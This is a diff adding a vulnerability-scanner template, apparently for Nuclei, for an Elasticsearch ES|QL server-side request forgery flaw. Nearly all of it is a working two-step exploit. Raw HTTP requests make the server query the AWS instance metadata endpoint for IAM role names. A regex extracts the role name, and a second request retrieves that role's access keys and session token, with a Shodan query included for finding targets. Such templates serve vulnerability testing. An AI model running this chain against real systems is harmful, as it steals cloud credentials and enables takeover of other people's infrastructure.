@@ -1,0 +1,61 @@
+id: elasticsearch-esql-aws-metadata-ssrf
+
+info:
+  name: Elasticsearch ES|QL SSRF - AWS Instance Metadata
+  author: chipo
+  severity: critical
+  description: |
+    Elasticsearch with the ES|QL experimental flag enabled allows server-side request forgery via
+    the FROM CSV() function. An unauthenticated attacker can exfiltrate AWS instance metadata
+    including IAM role credentials in a two-step attack.
+  reference:
+    - https://github.com/projectdiscovery/nuclei-templates/issues/16724
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10.0
+    cwe-id: CWE-918
+  metadata:
+    verified: true
+    max-request: 2
+    vendor: elasticsearch
+    product: elasticsearch
+    shodan-query: '"ElasticSearch"'
+  tags: elasticsearch,ssrf,aws,metadata,oast,kev
+
+http:
+  - raw:
+      - |
+        POST /_query HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"query":"FROM CSV('http://169.254.169.254/latest/meta-data/iam/security-credentials/') | LIMIT 1"}
+      - |
+        POST /_query HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"query":"FROM CSV('http://169.254.169.254/latest/meta-data/iam/security-credentials/{{role_name}}') | LIMIT 1"}
+
+    extractors:
+      - type: regex
+        name: role_name
+        group: 1
+        part: body
+        internal: true
+        regex:
+          - '"_c0":"([A-Za-z0-9_-]+)"'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "AccessKeyId"
+          - "SecretAccessKey"
+          - "Token"
+        condition: and
+
+      - type: status
+        status:
+          - 200
